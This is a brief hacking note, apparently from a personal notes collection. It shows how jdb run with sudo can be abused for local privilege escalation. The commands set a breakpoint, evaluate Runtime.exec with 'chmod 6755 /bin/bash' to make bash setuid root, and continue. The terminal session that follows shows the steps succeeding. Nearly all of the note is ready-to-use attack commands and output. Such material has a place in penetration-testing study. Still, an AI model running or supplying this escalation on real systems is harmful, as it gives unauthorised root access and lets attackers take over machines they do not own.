# java jdb execute commands
```
stop on Main.main
run
eval java.lang.Runtime.getRuntime().exec("chmod 6755 /bin/bash");
cont
```
```
user@hostname:~$ sudo /usr/bin/jdb -classpath /root/ Main
Initializing jdb ...
> stop on Main.main
Deferring breakpoint Main.main.
It will be set after the class is loaded.
> run
run Main
Set uncaught java.lang.Throwable
Set deferred uncaught java.lang.Throwable
>
VM Started: Set deferred breakpoint Main.main

Breakpoint hit: "thread=main", Main.main(), line=5 bci=0
5               System.out.println("Hello World!");

main[1] eval java.lang.Runtime.getRuntime().exec("chmod 6755 /bin/bash");
 java.lang.Runtime.getRuntime().exec("chmod 6755 /bin/bash"); = "Process[pid=3332, exitValue="not exited"]"
main[1] cont
> Hello World!

The application exited
```

` zet/20221003150292/README.md `

# Related

- [20221007220451](/zet/20221007220451/README.md) hacking notes node


Tags:

    
